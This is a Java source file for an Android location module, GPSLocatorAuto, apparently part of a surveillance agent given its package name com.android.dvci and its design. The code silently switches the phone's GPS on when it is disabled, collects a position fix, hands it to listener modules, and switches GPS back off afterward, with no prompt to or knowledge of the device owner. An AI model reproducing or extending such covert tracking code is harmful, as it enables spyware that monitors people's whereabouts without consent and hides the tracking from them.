package com.android.dvci.module.position;

import java.util.ArrayList;
import java.util.List;

import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.Handler;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;

public class GPSLocatorAuto implements LocationListener, Runnable {

	private static final String TAG = "GPSLocatorAuto";

	private static GPSLocatorAuto instance;
	// private boolean started = false;
	private List<GPSLocationListener> listeners;
	private GPSLocatorPeriod locator;

	private long stopDelay = 5 * 60 * 1000;
	private boolean gotValidPosition;

	private boolean turnedOn;

	private GPSLocatorAuto() {
		if (Cfg.DEBUG) {
			stopDelay = 2 * 60 * 1000;
		}
		listeners = new ArrayList<GPSLocationListener>();
	}

	public static GPSLocatorAuto self() {
		if (instance == null) {
			synchronized (GPSLocatorAuto.class) {
				if (instance == null) {
					instance = new GPSLocatorAuto();
				}
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (self): new instance");
			}
		}

		return instance;
	}

	/**
	 * Lo start del module position chiama questo metodo che: lancia il
	 * GPSLocator se necessario, contestualmente ad un timer di 5 minuti, al
	 * termine del quale il GPSLocator viene chiuso. se ha una posizione valida
	 * la restituisce via callback senno' aggiunge il richiedente alla lista,
	 * che verra' svuotata al primo fix.
	 * 
	 * @param listener
	 */
	public boolean start(GPSLocationListener listener) {
		try {
			synchronized (this) {
				if (locator == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start): new GPSLocatorPeriod");
					}

					locator = new GPSLocatorPeriod(this, 0);
					if (!locator.isGPSEnabled()) {
						if (locator.canToggleGPS()) {

							locator.turnGPSOn();
							turnedOn = true;
						} else {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (start): cannot start GPS");
							}
							return false;
						}
					}

					locator.start();
				}

				Handler handler = Status.self().getDefaultHandler();
				handler.removeCallbacks(this);
				handler.postDelayed(this, stopDelay);
			}

			// listener.onLocationChanged(locator.getLastKnownPosition());

			synchronized (listeners) {
				if (gotValidPosition) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start): got Valid position, return it");
					}

					listener.onLocationChanged(locator.getLastKnownPosition());
					gotValidPosition = false;
				} else {
					if (!listeners.contains(listener)) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (start): adding to listeners");
						}

						listeners.add(listener);
					}
				}
			}
		} catch (Exception ex) {
			listener.onLocationChanged(null);
			return false;
		}

		return true;
	}

	public void unregister(GPSLocationListener listener) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (unregister): unregistering to listeners");
		}
		synchronized (listeners) {
			if (listeners.contains(listener)) {
				listeners.remove(listener);
			}
			if (listeners.isEmpty()) {
				stop();
			}
		}
	}

	public void stop() {
		try {
			synchronized (this) {

				if (locator != null) {
					if (turnedOn) {
						locator.turnGPSOff();
					}
					locator.halt();
				}

			}
			synchronized (listeners) {
				listeners.clear();
			}
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				ex.printStackTrace();
				Check.log(TAG + " " + ex);
			}
		} finally {

			locator = null;
			gotValidPosition = false;

		}
	}

	/** executed by handler postDelayed, 5 minutes after the last start */
	public void run() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (run) passed without start: " + stopDelay);
		}

		for (GPSLocationListener listener : listeners) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onLocationChanged): send location to: " + listener);
			}

			listener.onLocationChanged(null);
		}
		stop();
	}

	/**
	 * This method is called by the GPSLocator the first time it fixes
	 */
	public void onLocationChanged(Location location) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onLocationChanged): new location: " + location);
		}

		synchronized (listeners) {
			gotValidPosition = true;

			for (GPSLocationListener listener : listeners) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onLocationChanged): send location to: " + listener);
				}

				listener.onLocationChanged(location);
			}

			listeners.clear();
		}
	}

	public void onProviderDisabled(String provider) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onProviderDisabled)");
		}
	}

	public void onProviderEnabled(String provider) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onProviderEnabled)");
		}
	}

	public void onStatusChanged(String provider, int status, Bundle extras) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onStatusChanged)");
		}
	}
}
